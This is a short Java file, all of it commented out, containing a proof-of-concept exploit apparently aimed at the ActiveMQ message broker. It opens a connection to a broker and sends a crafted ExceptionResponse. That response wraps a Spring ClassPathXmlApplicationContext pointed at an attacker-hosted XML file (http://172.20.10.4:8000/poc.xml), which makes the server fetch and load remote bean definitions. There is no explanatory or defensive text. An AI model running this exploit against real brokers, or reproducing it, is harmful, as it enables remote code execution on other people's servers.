//package com.example;
//
//import org.apache.activemq.ActiveMQConnection;
//import org.apache.activemq.ActiveMQConnectionFactory;
//import org.apache.activemq.command.ActiveMQMessage;
//import org.apache.activemq.command.ExceptionResponse;
//import org.apache.activemq.command.MessageAck;
//import  org.springframework.context.support.ClassPathXmlApplicationContext;
//import javax.jms.Connection;
//import javax.jms.Session;
//import javax.jms.TextMessage;
//
//
//public class ExceptionResponseExploit {
//
//    public static void main(String[] args) throws Exception {
//
//        ActiveMQConnectionFactory factory = new ActiveMQConnectionFactory("tcp://127.0.0.1:61616");
//
//        Connection connection = factory.createConnection();
//        connection.start();
//
//
//        Exception obj2 = new ClassPathXmlApplicationContext("http://172.20.10.4:8000/poc.xml");
//
//        ExceptionResponse response = new ExceptionResponse(obj2);
//
//        response.setException(obj2);
//
//        ((ActiveMQConnection)connection).getTransportChannel().oneway(response);
//
//        connection.close();
//
//
//    }
//
//}